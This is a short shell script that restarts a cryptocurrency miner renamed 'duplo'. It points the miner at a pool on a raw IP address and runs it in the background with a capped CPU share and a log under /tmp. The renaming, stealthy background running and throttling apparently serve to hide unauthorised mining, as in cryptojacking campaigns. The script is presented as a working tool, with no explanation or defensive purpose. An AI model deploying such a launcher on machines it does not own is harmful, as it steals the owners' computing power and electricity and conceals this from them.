pkill duplo
sleep 7
duplo -o 193.42.118.111:3568 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/duplo/duplo.log --donate-level=1 --print-time=60 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=64 --av=1 --variant -1
echo -e 'ALL WORKS! tail -f /tmp/duplo/duplo.log'
